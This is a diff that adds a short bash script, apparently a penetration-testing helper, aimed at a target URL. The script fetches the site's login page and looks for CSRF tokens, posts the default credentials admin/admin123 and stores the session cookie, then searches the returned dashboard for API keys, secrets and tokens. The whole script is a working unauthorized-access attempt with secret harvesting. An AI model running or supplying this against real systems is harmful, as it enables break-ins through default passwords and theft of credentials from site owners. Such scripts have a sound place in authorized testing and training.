@@ -1,0 +1,13 @@
+#!/bin/bash
+TARGET=$1
+echo "[+] Checking login page..."
+curl -s "$TARGET/login" -o login.html
+grep -iE 'token|csrf' login.html
+
+echo "[+] Trying default creds..."
+curl -s -X POST "$TARGET/login" \
+  -d "username=admin&password=admin123" \
+  -c cookie.txt -o dashboard.html
+
+echo "[+] Searching for dashboard leaks..."
+grep -E 'apiKey|secret|token' dashboard.html
